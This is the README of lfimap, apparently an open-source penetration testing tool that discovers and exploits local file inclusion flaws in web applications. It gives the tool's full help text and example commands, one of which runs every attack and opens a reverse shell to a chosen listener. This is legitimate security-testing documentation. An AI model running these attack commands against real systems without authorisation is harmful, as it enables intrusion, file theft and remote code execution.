# lfimap
## Local file inclusion discovery and exploitation tool

### Main features
- Filter wrapper for arbitrary file inclusion
- Data wrapper for remote command execution
- Input wrapper for remote command execution
- Expect wrapper for remote command execution
- File wrapper for arbitrary file inclusion
- Path truncation for arbitrary file inclusion
- Remote file inclusion for code execution
- Command injection for remote command execution
- Generic time based blind sql injection testing
- Basic reflected XSS testing
- Support for POST argument testing
- Support for custom http headers
- Support for specifying cookies for authenticated requests
- Support for specifying web proxy to send requests through
- Support for specifying delay in between requests
- Support for payload manipulation via url and base64 encoding(s)
- Support for automated reverse shell access upon successful remote code execution

### Documentation
- [Installation](https://github.com/hansmach1ne/lfimap/wiki/Installation)

### -h, --help

```                  
usage: lfimap.py [-U [url]] [-F [urlfile]] [-C <cookie>] [-D <data>] [-H <header>] [-M <method>]
                 [-P <proxy>] [--useragent <agent>] [--referer <referer>] [--placeholder <name>]
                 [--delay <milis>] [--http-ok <number>] [--no-stop] [-f] [-i] [-d] [-e] [-t] [-r]
                 [-c] [-file] [-heur] [-a] [-n <U|B>] [-q] [-x] [--lhost <lhost>] [--lport <lport>]
                 [-wT <path>] [--use-long] [--log <file>] [-v] [-h]

LFImap, Local File Inclusion discovery and exploitation tool

MANDATORY:
  -U [url]              Specify url, Ex: "http://example.org/vuln.php?param=PWN"
  -F [urlfile]          Specify url wordlist (every line should have --param|"PWN")

GENERAL OPTIONS:
  -C <cookie>           Specify session cookie, Ex: "PHPSESSID=1943785348b45"
  -D <data>             Specify HTTP request form data
  -H <header>           Specify additional HTTP header(s). Ex: "X-Forwarded-For:127.0.0.1"
  -M <method>           Specify HTTP request method to use for testing
  -P <proxy>            Specify proxy. Ex: "http://127.0.0.1:8080"
  --useragent <agent>   Specify HTTP user agent header value
  --referer <referer>   Specify HTTP referer header value
  --placeholder <name>  Specify different testing placeholder value (default "PWN")
  --delay <milis>       Specify delay in miliseconds after each request
  --http-ok <number>    Specify http response code(s) to treat as valid
  --no-stop             Don't stop using same method upon findings

ATTACK TECHNIQUE:
  -f, --filter          Attack using filter wrapper
  -i, --input           Attack using input wrapper
  -d, --data            Attack using data wrapper
  -e, --expect          Attack using expect wrapper
  -t, --trunc           Attack using path truncation with wordlist (default "short.txt")
  -r, --rfi             Attack using remote file inclusion
  -c, --cmd             Attack using command injection
  -file, --file         Attack using file wrapper
  -heur, --heuristics   Test for miscellaneous vulns using heuristics
  -a, --all             Use all available testing methods

PAYLOAD OPTIONS:
  -n <U|B>              Specify additional payload encoding(s). "U" for URL, "B" for base64
  -q, --quick           Perform quick testing with few payloads
  -x, --exploit         Exploit to reverse shell if possible (Setup reverse listener first)
  --lhost <lhost>       Specify local ip address for reverse connection
  --lport <lport>       Specify local port number for reverse connection

WORDLIST OPTIONS:
  -wT <path>            Specify path to wordlist for truncation test modality
  --use-long            Use "wordlists/long.txt" wordlist for truncation test modality

OUTPUT OPTIONS:
  --log <file>          Output all requests and responses to specified file

OTHER:
  -v, --verbose         Print more detailed output when performing attacks
  -h, --help            Print this help message
  
```

### Examples 

#### 1) All attacks with '-a' (filter, input, data, expect and file wrappers, remote file inclusion, command injection, XSS, error disclosure).
`python3 lfimap.py -U "http://IP/vuln.php?param=PWN" -C "PHPSESSID=XXXXXXXX" -a`  

![Lfimap-1](https://user-images.githubusercontent.com/57464251/186299395-c6a91666-0e95-484e-8537-6f248d257f5b.png)


#### 2) Reverse shell command execution attack with '-x'
`python3 lfimap.py -U "http://IP/vuln.php?param=PWN" -C "PHPSESSID=XXXXXXXX" -a --lhost IP --lport PORT -x`  

![Lfimap-2](https://user-images.githubusercontent.com/57464251/186299661-7d6b480b-953f-4a7e-a806-5f39435f07fd.png)


#### 3) Post argument testing with '-D'

`python3 lfimap.py -U "http://IP/index.php" -D "page=PWN" -a`

![Lfimap-3](https://user-images.githubusercontent.com/57464251/186302047-0a2e9ab9-e4f0-43bb-b245-0235b6950ea0.png)


If you notice any issues with the software, please open up an issue. I will gladly take a look at it and try to resolve it. <br>
Pull requests are welcome.

[!] Disclaimer: Lfimap usage for attacking web applications without consent of the application owner is illegal. Developers assume no liability and are 
not responsible for any misuse and damage caused by using this program.
